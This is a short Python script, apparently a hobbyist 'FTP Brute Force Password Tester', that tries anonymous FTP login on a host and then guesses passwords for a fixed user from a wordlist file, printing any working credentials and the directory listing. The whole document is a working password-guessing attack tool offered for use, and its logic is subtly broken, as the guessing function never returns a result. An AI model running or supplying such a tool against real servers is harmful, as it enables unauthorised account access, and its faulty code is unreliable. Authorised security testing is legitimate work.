#!/usr/bin/env python3
from ftplib import FTP

port = '21'
host = '127.0.0.1'
dictFile = "passwords.txt"
username = "ftp_user"
ftpSess = FTP(host)


def tryPass(password):
    try:
        ftpSess = FTP(host, username, password)
        print('User Login Successful')
        print(username + ":" + password)
        print(ftpSess.getwelcome())
        ftpSess.retrlines('LIST')
        ftpSess.quit()
    except Exception:
        pass

def loadDict():
    print("Loading Dictionary...")
    PassList = open(dictFile, "r")
    print("Trying Combinations...")
    for line in PassList:
        password = line.rstrip()
        if(tryPass(password)):
            print('Found Password: ' + password)
            PassList.close()
            exit()
    print('No Password Found...')
    exit()

def checkAnon():
    if(ftpSess.login()):
        print('Anonymous Login Successful')
        print(ftpSess.getwelcome())
        print('Printing Contents..')
        ftpSess.retrlines('LIST')
        ftpSess.quit()
    else:
        loadDict()

def intro():
    print('#######################################')
    print('    FTP Brute Force Password Tester')
    print('------------- Velivion17-------------')
    print('#######################################')
    print('')
    checkAnon()

intro()
